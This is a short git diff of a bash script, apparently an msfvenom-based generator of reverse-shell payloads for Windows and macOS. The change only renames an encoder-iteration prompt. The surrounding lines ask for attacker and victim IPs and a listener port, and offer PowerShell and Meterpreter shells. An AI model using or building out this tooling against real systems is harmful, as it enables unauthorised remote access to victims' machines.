@@ -392,7 +392,7 @@ elif [[ $input == "2" ]]; then ## Windows
         read -p "Attacker IP Address: " IP
         read -p "Victim IP Address: " VI
         read -p "Listener Port: " PO
-        read -p "shikata iterations: " SH
+        read -p "Encod Iteration: " SH
     echo -e "\n${BLUE}╔═════{ Type of Shell:${XX}"   
         echo -e "══{1. Powershell"
         echo -e "══{2. Meterpreter"
@@ -543,7 +543,7 @@ elif [[ $input == "3" ]]; then ## MacOS
         read -p "Attacker IP Address: " IP
         read -p "Victim IP Address: " VI
         read -p "Listener Port: " PO
-        read -p "shikata iterations: " SH
+        read -p "Encod Iteration: " SH
     echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
     mkdir Payload_List/Mac 2>/dev/null
         echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Mac/Read_Me.txt
